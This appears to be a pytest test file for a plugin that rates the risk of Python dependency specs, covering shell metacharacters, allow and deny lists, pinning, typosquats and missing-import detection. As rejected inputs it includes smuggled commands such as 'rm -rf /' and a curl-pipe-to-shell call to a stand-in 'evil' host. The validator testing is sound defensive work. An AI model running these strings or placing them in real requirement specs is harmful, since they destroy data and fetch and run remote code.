"""Tests for plugins.dependency_risk: pure heuristics, network disabled so
results are deterministic and offline."""
import pytest

from plugins import dependency_risk as risk


def test_malformed_spec_is_always_high_risk():
    r = risk.assess_requirement("requests; rm -rf /", network_check=False)
    assert r.valid is False
    assert r.level == "high"


def test_shell_metacharacters_rejected():
    for hostile in ["pkg && curl evil.sh | sh", "pkg`whoami`", "pkg==1.0 -e git+https://evil"]:
        r = risk.assess_requirement(hostile, network_check=False)
        assert r.valid is False, hostile
        assert r.level == "high"


def test_allowlisted_package_is_low_risk_regardless():
    r = risk.assess_requirement("requests==2.31.0", allowlist={"requests"}, network_check=False)
    assert r.level == "low"
    assert r.score == 0


def test_denylisted_package_is_high_risk():
    r = risk.assess_requirement("evilpkg==1.0", denylist={"evilpkg"}, allowlist=set(), network_check=False)
    assert r.level == "high"
    assert r.score == 100


def test_unpinned_dependency_adds_risk():
    pinned = risk.assess_requirement("somepkg==1.0.0", allowlist=set(), network_check=False)
    unpinned = risk.assess_requirement("somepkg", allowlist=set(), network_check=False)
    assert unpinned.score > pinned.score
    assert any("unpinned" in r for r in unpinned.reasons)


def test_typosquat_of_popular_package_is_flagged():
    r = risk.assess_requirement("reqeusts==1.0.0", allowlist=set(), denylist=set(), network_check=False)
    assert r.level == "high"
    assert any("typosquat" in reason for reason in r.reasons)


def test_already_installed_package_reduces_risk():
    installed = risk.assess_requirement("pytest", allowlist=set(), network_check=False)
    not_installed = risk.assess_requirement("totally_unknown_package_xyz", allowlist=set(), network_check=False)
    assert installed.already_installed is True
    assert not_installed.already_installed is False
    assert installed.score < not_installed.score
    assert installed.level == "low"


@pytest.mark.parametrize("name,pkg", [("yaml", "pyyaml"), ("bs4", "beautifulsoup4"), ("PIL", "pillow")])
def test_import_to_package_resolution(name, pkg):
    assert risk.resolve_import_name(name) == pkg


def test_detect_missing_imports_ignores_stdlib_and_installed():
    src = "import os\nimport json\nimport totally_unknown_package_xyz\n"
    missing = risk.detect_missing_imports(src)
    assert missing == ["totally_unknown_package_xyz"]


def test_detect_missing_imports_handles_syntax_error_gracefully():
    assert risk.detect_missing_imports("def broken(:\n") == []


def test_network_lookup_failure_is_conservative_not_fatal(monkeypatch):
    monkeypatch.setattr(risk, "_pypi_lookup", lambda name, timeout: None)
    r = risk.assess_requirement("somepkg==1.0.0", allowlist=set(), network_check=True)
    assert any("could not verify" in reason for reason in r.reasons)
    assert r.level in ("low", "medium", "high")  # never raises
